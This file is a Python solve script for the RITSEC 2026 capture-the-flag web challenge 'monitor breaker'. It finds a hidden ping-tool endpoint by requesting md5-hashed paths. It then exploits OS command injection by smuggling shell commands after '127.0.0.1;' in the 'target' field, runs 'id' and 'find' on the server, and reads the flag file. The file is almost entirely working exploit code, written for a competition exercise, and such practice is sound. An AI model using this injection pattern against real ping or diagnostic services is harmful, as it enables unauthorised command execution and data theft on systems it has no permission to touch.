#!/usr/bin/env python3
"""Solve the RITSEC 2026 web challenge "monitor breaker"."""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import shlex
import sys
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar


DEFAULT_URL = (
    "https://monitor-breaker-f691b9f6-c897-491f-a280-924cdfda920e.ctf.ritsec.club/"
)
FLAG_RE = re.compile(r"RS\{[^}]+\}")
SYS_RE = re.compile(r'href="(/_sys/[0-9a-f]{32})"')
TITLE_RE = re.compile(r"<title>\s*([^<]+?)\s*</title>", re.IGNORECASE)


class Client:
    def __init__(self) -> None:
        jar = CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    def request(
        self,
        url: str,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, str]:
        request = urllib.request.Request(
            url,
            data=data,
            headers=headers or {},
            method="POST" if data is not None else "GET",
        )

        try:
            with self.opener.open(request, timeout=15) as response:
                body = response.read().decode("utf-8", "replace")
                return response.status, body
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", "replace")
            return exc.code, body


def md5_text(value: int) -> str:
    return hashlib.md5(str(value).encode()).hexdigest()


def get_title(html: str) -> str:
    match = TITLE_RE.search(html)
    return match.group(1).strip() if match else "(no title)"


def clean_output(raw: str) -> str:
    lines = []
    for line in raw.splitlines():
        if line.strip() == "/bin/sh: 1: ping: not found":
            continue
        lines.append(line)
    return "\n".join(lines).strip()


def discover_hidden_monitor(client: Client, base_url: str) -> str:
    status, home = client.request(base_url)
    if status != 200:
        raise RuntimeError(f"dashboard request failed with HTTP {status}")

    linked_paths = set(SYS_RE.findall(home))
    print(f"[+] Dashboard exposes {len(linked_paths)} monitor link(s)")
    for linked in sorted(linked_paths):
        print(f"    - {linked}")

    hidden_endpoint = ""
    print("[+] Enumerating candidate monitor hashes md5(0..9)")
    for i in range(10):
        digest = md5_text(i)
        path = f"/_sys/{digest}"
        url = urllib.parse.urljoin(base_url, path)
        status, body = client.request(url)
        title = get_title(body) if status == 200 else "(missing)"
        visibility = "linked" if path in linked_paths else "hidden"
        print(f"    - {i}: {status} {visibility} {path} [{title}]")
        if status == 200 and path not in linked_paths and "Network Ping Tool" in body:
            hidden_endpoint = url

    if not hidden_endpoint:
        raise RuntimeError("failed to locate the hidden network monitor")

    print(f"[+] Hidden monitor found: {hidden_endpoint}")
    return hidden_endpoint


def post_json(client: Client, url: str, form: dict[str, str]) -> dict[str, object]:
    data = urllib.parse.urlencode(form).encode()
    status, body = client.request(
        url,
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    if status != 200:
        raise RuntimeError(f"POST {url} failed with HTTP {status}: {body[:200]!r}")
    return json.loads(body)


def run_command(client: Client, monitor_url: str, command: str) -> str:
    payload = {
        "target": f"127.0.0.1;{command}",
        "command_type": "ping",
    }
    response = post_json(client, monitor_url, payload)
    output = str(response.get("output", ""))
    error = response.get("error")
    if error and not output:
        raise RuntimeError(f"remote command failed: {error}")
    return clean_output(output)


def find_flag_path(client: Client, monitor_url: str) -> str:
    commands = [
        "find /app -maxdepth 1 -iname 'flag*' 2>/dev/null",
        "find / -maxdepth 3 -iname 'flag*' 2>/dev/null",
    ]
    for command in commands:
        output = run_command(client, monitor_url, command)
        for line in output.splitlines():
            if "flag" in line.lower():
                print(f"[+] Flag file candidate: {line}")
                return line.strip()
    raise RuntimeError("failed to locate a flag file")


def extract_flag(text: str) -> str:
    match = FLAG_RE.search(text)
    if not match:
        raise RuntimeError("flag not found in command output")
    return match.group(0)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Exploit the hidden monitor and extract the monitor-breaker flag.",
    )
    parser.add_argument(
        "url",
        nargs="?",
        default=DEFAULT_URL,
        help="Challenge base URL (default: current team instance)",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    base_url = args.url.rstrip("/") + "/"
    client = Client()

    print(f"[+] Target: {base_url}")
    monitor_url = discover_hidden_monitor(client, base_url)

    whoami = run_command(client, monitor_url, "id")
    print(f"[+] Command injection confirmed: {whoami}")

    flag_path = find_flag_path(client, monitor_url)
    flag_contents = run_command(client, monitor_url, f"cat {shlex.quote(flag_path)}")
    flag = extract_flag(flag_contents)

    print(f"[+] Flag: {flag}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted", file=sys.stderr)
        raise SystemExit(130)
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        raise SystemExit(1)
